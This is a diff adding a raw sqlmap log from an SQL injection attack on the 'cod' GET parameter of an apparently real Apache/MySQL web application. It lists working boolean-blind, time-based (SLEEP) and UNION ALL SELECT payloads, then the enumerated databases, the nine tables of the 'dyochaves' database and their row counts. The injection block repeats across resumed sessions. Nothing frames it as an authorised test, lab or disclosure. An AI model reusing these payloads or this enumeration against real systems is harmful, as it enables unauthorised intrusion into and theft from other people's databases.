@@ -1,0 +1,107 @@
+sqlmap identified the following injection point(s) with a total of 61 HTTP(s) requests:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1 AND 5936=5936
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: cod=-7014 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71626a7071,0x4c7765566262524f69655652437842745a4b42624f6f516343776666545768634a6149704b715276,0x71716a6b71)-- oqRg
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+available databases [2]:
+[*] dyochaves
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1 AND 5936=5936
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: cod=-7014 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71626a7071,0x4c7765566262524f69655652437842745a4b42624f6f516343776666545768634a6149704b715276,0x71716a6b71)-- oqRg
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: dyochaves
+[9 tables]
++--------------------+
+| biografia          |
+| conta_files_crono  |
+| conta_files_imagem |
+| conta_files_mural  |
+| conta_files_obra   |
+| cronologia         |
+| imagem             |
+| mural              |
+| obra               |
++--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=1 AND 5936=5936
+    Vector: AND [INFERENCE]
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind
+    Payload: cod=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 5 columns
+    Payload: cod=-7014 UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x71626a7071,0x4c7765566262524f69655652437842745a4b42624f6f516343776666545768634a6149704b715276,0x71716a6b71)-- oqRg
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,NULL,[QUERY][GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0.12
+Database: dyochaves
+[9 tables]
++--------------------+
+| biografia          |
+| conta_files_crono  |
+| conta_files_imagem |
+| conta_files_mural  |
+| conta_files_obra   |
+| cronologia         |
+| imagem             |
+| mural              |
+| obra               |
++--------------------+
+
+Database: dyochaves
++--------------------+---------+
+| Table              | Entries |
++--------------------+---------+
+| imagem             | 128     |
+| cronologia         | 34      |
+| obra               | 21      |
+| mural              | 6       |
+| biografia          | 1       |
+| conta_files_crono  | 1       |
+| conta_files_imagem | 1       |
+| conta_files_mural  | 1       |
+| conta_files_obra   | 1       |
++--------------------+---------+
+
